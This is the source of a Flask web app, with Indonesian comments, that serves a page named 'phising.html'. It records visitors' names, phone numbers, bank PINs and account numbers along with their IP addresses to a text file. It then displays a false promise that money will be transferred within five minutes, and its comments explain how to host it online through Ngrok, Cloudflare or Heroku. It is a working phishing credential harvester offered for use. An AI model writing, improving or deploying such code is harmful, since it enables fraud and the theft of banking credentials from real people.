from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('phising.html')

@app.route('/proses', methods=['POST'])
def proses_input():
    # 1. Tangkap IP Address user
    # request.headers.getlist(...) dipake kalau server lo ntar di-host online (pake Cloudflare/Ngrok/Heroku)
    # request.remote_addr dipake kalau diproses lokal (Termux/PC)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    # 2. Tangkap data dari form HTML
    nama = request.form.get('nama_user')
    hp = request.form.get('telepon')
    pin = request.form.get('pin_user')
    rekening = request.form.get('nomor_rekening')

    # 3. Format teks (sekarang ada IP-nya di paling depan)
    data_teks = f"IP: {user_ip} | Nama: {nama} | HP: {hp} | PIN: {pin} | Rek: {rekening}\n"

    # 4. Simpan ke file 'hasil_input.txt'
    with open("data.txt", "a", encoding="utf-8") as file:
        file.write(data_teks)

    print(f"[DATA + IP TERSIMPAN] {data_teks.strip()}")

    return f"""
    <div style="text-align:center; font-family:sans-serif; padding-top:50px;">
        <h2 style="color:green;">Berhasil Diterima!</h2>
        <p>Data atas nama <b>{nama}</b><br>uang akan di kirim ke <b>{rekening}</b> dalam 5 menit</p>
    </div>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)